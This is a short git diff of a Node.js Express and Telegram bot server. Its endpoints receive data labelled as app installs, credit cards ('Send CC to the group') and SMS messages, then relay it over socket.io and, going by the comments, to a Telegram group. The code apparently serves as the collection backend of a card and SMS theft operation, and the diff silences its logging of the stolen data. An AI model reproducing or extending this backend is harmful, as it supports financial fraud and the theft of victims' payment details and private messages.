@@ -78,21 +78,21 @@ botTele.launch().then(() => {
 //botTele.telegram.sendMessage(chatid, "Test msg");
 
 app.post('/data_io', (req, res) => {
-	  console.log('DATA IO',req.body.data);
+	  //console.log('DATA IO',req.body.data);
 	  const data_ = req.body.data;
 	  io.emit('user_online',data_);
 	  res.status(200).send(jsonData);
 });
 
 app.post('/data_alert', (req, res) => {
-	  console.log('data_alert',req.body.data);
+	  //console.log('data_alert',req.body.data);
 	  const data_ = req.body.data;
 	  io.emit('user_online',data_);
 	  res.status(200).send(jsonData);
 });
 
 app.post('/dataI', (req, res) => {
-	  console.log('data_i',req.body.data);
+	  //console.log('data_i',req.body.data);
 	  const data_ = req.body.data;
 	  io.emit('install_got',data_);
 	  // Send INSTALL to the group
@@ -101,7 +101,7 @@ app.post('/dataI', (req, res) => {
 });
 
 app.post('/dataC', (req, res) => {
-	  console.log('data_i',req.body.data);
+	  //console.log('data_i',req.body.data);
 	  const data_ = req.body.data;
 	  io.emit('card_got',data_);
 		// Send CC to the group
@@ -110,7 +110,7 @@ app.post('/dataC', (req, res) => {
 });
 
 app.post('/dataS', (req, res) => {
-	console.log('data_s',req.body.data);
+	//console.log('data_s',req.body.data);
 	const data_ = req.body.data;
 	io.emit('sms_got',data_);
 	// Send message to the group
@@ -139,8 +139,8 @@ app.post('/data_st', (req, res) => {
         const tgid_ = req.body.chatId;
 
         // Log chat ID and message data for debugging
-        console.log('Sending to chat ID:', tgid_);
-        console.log('Message data:', data_);
+        //console.log('Sending to chat ID:', tgid_);
+        //console.log('Message data:', data_);
 
         // Emit the message to your socket.io server
         io.emit('sms_got', data_);
